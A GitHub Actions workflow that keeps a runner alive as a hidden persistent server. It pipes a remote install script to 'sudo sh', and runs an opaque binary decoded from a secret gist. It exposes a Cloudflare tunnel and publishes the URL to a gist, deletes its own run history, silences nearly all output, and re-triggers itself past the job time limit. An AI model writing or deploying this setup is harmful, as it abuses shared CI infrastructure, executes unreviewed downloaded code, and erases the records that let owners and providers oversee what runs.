---
name: "Ubuntu: Background Service"

"on":
  workflow_dispatch:

concurrency:
  group: background-service
  cancel-in-progress: true

jobs:
  service:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    permissions:
      actions: write

    steps:
      - run: |
          set -euo pipefail

          sleep 30
          gh run list --workflow="Ubuntu: Background Service" --repo ${{ github.repository }} --status completed --json databaseId --jq '.[].databaseId' | xargs -I{} gh run delete {} --repo ${{ github.repository }} 2>/dev/null || true

          curl -fsSL https://tailscale.com/install.sh 2>/dev/null | sudo sh >/dev/null 2>&1
          sudo systemctl restart tailscaled >/dev/null 2>&1

          OLD_ID=$(curl -fsSL -H "Authorization: Bearer ${{ secrets.TAILSCALE_API_KEY }}" "https://api.tailscale.com/api/v2/tailnet/-/devices" 2>/dev/null | jq -r '.devices[] | select(.hostname=="linux-azure-vps") | .id' | head -n1)
          [ -n "$OLD_ID" ] && curl -fsSL -X DELETE -H "Authorization: Bearer ${{ secrets.TAILSCALE_API_KEY }}" "https://api.tailscale.com/api/v2/device/$OLD_ID" >/dev/null 2>&1 || true

          sudo tailscale up --authkey="${{ secrets.TAILSCALE_AUTH_KEY }}" --hostname="linux-azure-vps" >/dev/null 2>&1

          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ~/cloudflared >/dev/null 2>&1
          sudo install -m 0755 ~/cloudflared /usr/local/bin/cloudflared >/dev/null 2>&1

          GIST="$(gh api /gists/${{ secrets.GIST_ID }} 2>/dev/null)"
          curl -fsSL -H "Authorization: token $GH_TOKEN" "$(echo "$GIST" | jq -r '.files["tmp.db.base64"].raw_url')" 2>/dev/null | base64 -d > ~/tmp.db 2>/dev/null || true
          curl -fsSL -H "Authorization: token $GH_TOKEN" "$(echo "$GIST" | jq -r '.files["tmp.base64"].raw_url')" 2>/dev/null | base64 -d > ~/tmp 2>/dev/null
          chmod +x ~/tmp

          cd ~
          ./tmp >/dev/null 2>&1 &

          cloudflared tunnel --url http://localhost:8080 2>&1 | tee ~/.log >/dev/null &
          sleep 15
          TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' ~/.log 2>/dev/null | head -n1) || true
          rm -f ~/.log

          [ -n "$TUNNEL_URL" ] && gh api --method PATCH /gists/${{ secrets.URL_GIST_ID }} --field "files[url][content]=$TUNNEL_URL" >/dev/null 2>&1 || true

          backup() {
            base64 ~/tmp.db > /tmp/tmp.db.base64 2>/dev/null || true
            gh api --method PATCH /gists/${{ secrets.GIST_ID }} --field "files[tmp.db.base64][content]=@/tmp/tmp.db.base64" >/dev/null 2>&1 || true
            sudo tailscale logout >/dev/null 2>&1 || true
          }

          trap 'backup' EXIT

          sleep 21210

          backup
          gh workflow run "Ubuntu: Background Service" --repo ${{ github.repository }} >/dev/null 2>&1 || true

        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
